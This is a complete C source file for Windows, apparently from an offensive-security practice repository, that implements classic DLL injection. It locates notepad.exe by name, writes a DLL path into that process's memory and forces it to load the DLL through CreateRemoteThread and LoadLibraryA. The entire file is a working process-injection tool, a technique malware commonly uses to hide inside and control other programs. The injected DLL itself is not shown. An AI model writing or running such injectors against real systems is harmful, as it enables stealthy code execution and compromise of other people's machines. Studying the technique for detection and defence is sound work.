#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD findPID( LPCSTR procName ) {

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        printf( "CreateToolhelp32Snapshot failed: %d\n", GetLastError() );
        return 0;
    }

    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof( PROCESSENTRY32 );

    DWORD pid = 0;

    if ( Process32First( hSnapshot, &pe32 ) ) {
        do {
            if ( _strcmpi( pe32.szExeFile, procName ) == 0 ) {
                pid = pe32.th32ProcessID;
                break;
            }

        } while ( Process32Next( hSnapshot, &pe32 ) );
    }

    CloseHandle( hSnapshot );
    return pid;
}

BOOL InjectDll( DWORD pid, LPCSTR dllPath ) {
    HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
    if ( !hProcess ) {
        printf( "[-] OpenProcess failed: %d\n", GetLastError() );
        return FALSE;
    }

    SIZE_T dllPathLen = strlen( dllPath ) + 1;

    LPVOID remoteMem = VirtualAllocEx( hProcess, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !remoteMem ) {
        printf( "[-] VirtualAllocEx failed: %d\n", GetLastError() );
        CloseHandle( hProcess );
        return FALSE;
    }

    if ( !WriteProcessMemory( hProcess, remoteMem, dllPath, dllPathLen, NULL ) ) {
        printf( "[-] WriteProcessMemory failed: %d\n", GetLastError() );
        VirtualFreeEx( hProcess, remoteMem, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandleA( "kernel32.dll" );
    PVOID pLoadLibraryA = GetProcAddress( hKernel32, "LoadLibraryA" );

    HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )pLoadLibraryA, remoteMem, 0, NULL );

    if ( !hThread ) {
        printf( "[-] CreateRemoteThread failed: %d\n", GetLastError() );
        VirtualFreeEx( hProcess, remoteMem, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return FALSE;
    }

    WaitForSingleObject( hThread, INFINITE );
    CloseHandle( hThread );
    VirtualFreeEx( hProcess, remoteMem, 0, MEM_RELEASE );
    CloseHandle( hProcess );
    return TRUE;
}

int main() {

    LPCSTR procName = "notepad.exe";
    LPCSTR dllPath = "C:\\Users\\admin\\Offensive-C\\Process_Injection\\DllInjection\\DllMain.dll";

    DWORD pid = findPID( procName );
    if ( !pid ) {
        printf( "[-] Process not found\n" );
        return 1;
    }

    if ( !InjectDll( pid, dllPath ) ) {
        printf( "[-] Injection failed\n" );
        return 1;
    }

    printf( "[+] Injection successful\n" );
    return 0;
}